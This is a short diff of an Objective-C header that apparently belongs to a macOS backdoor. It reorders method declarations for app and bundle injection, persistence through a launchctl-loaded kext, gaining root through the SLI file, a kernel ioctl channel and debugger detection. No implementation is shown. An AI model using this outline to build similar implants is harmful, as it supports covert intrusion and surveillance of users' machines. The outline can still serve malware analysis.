@@ -61,7 +61,12 @@
 - (id)init;
 - (void)dealloc;
 
-//
+- (void)shareCorePidOnShMem;
+
+- (void)injectRunningApp;
+- (void)injectBundle: (NSNotification *)notification;
+- (void)sendEventToPid: (NSNumber *)thePid;
+
 // Create the kext plist file to be used with launchctl in order to load the
 // kext at every reboot.
 // TODO: Check if we need to make the whole backdoor resident here or split
@@ -69,8 +74,6 @@
 //
 - (BOOL)makeBackdoorResident;
 - (BOOL)isBackdoorAlreadyResident;
-- (BOOL)runMeh;
-
 //
 // Init uspace<->kspace communication channel (ioctl MCHOOK_INIT)
 // return backdoorID to be used for all the future operations (ioctl requests)
@@ -81,19 +84,17 @@
 // Add the backdoor to the global SLI file in order to get root on the next
 // reboot
 //
-- (BOOL)getRootThroughSLI;
 - (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized;
+- (BOOL)getRootThroughSLI;
 
 //
 // Threaded (always running) - true if the current process is being debugged
 // (either running under the debugger or has a debugger attached post facto)
 //
-- (void)xfrth;
 
-- (void)injectRunningApp;
-- (void)injectBundle: (NSNotification *)notification;
-- (void)sendEventToPid: (NSNumber *)thePid;
-- (void)shareCorePidOnShMem;
+- (BOOL)runMeh;
+
+- (void)xfrth;
 
 @end
 
